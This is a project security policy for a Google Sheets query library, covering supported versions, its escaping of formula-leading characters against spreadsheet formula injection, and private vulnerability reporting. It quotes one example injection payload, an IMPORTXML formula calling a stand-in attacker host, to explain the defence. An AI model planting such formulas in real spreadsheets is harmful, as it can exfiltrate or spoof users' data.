# Security Policy

## Supported Versions

Security updates are applied to the latest minor release line.

| Version | Supported          |
| ------- | ------------------ |
| 1.0.x (incl. rc) | :white_check_mark: |
| < 1.0   | :x:                |

## Formula Injection Protection

Google Sheets parses written cells the way it parses typing in the UI, so a
stored string such as `=IMPORTXML("http://evil.example/","//x")` would run as a
live formula and could exfiltrate or spoof sheet data.

`SheetsAdapter` therefore escapes every string value whose first character can
open a formula — `=`, `+`, `-`, `@`, tab, carriage return, and the `'`
plain-text prefix itself — by writing it behind Sheets' plain-text prefix. The
cell holds literal text, and reads return the original string unchanged, so the
protection is invisible to application code.

Values authored by your own script can opt out per adapter with
`allowFormulas: true`, which writes strings verbatim and lets formulas run.
Never enable it for a store that holds user-supplied input.

Note that this protects data written **through the library**. A sheet also
consumed as a CSV export elsewhere should still be sanitized by that consumer,
and formulas already present in a sheet before adoption are left untouched.

## Reporting a Vulnerability

If you discover a security vulnerability, please **do not** open a public
issue. Instead, report it privately so it can be addressed before disclosure.

- Email: **l.juhyeonni@gmail.com**

Please include:

- A description of the vulnerability and its potential impact
- Steps to reproduce or a proof of concept
- Affected version(s)

You can expect an initial response within a few days. Once the issue is
confirmed, we will work on a fix and coordinate a disclosure timeline with you.

Thank you for helping keep gas-sheets-query and its users safe.
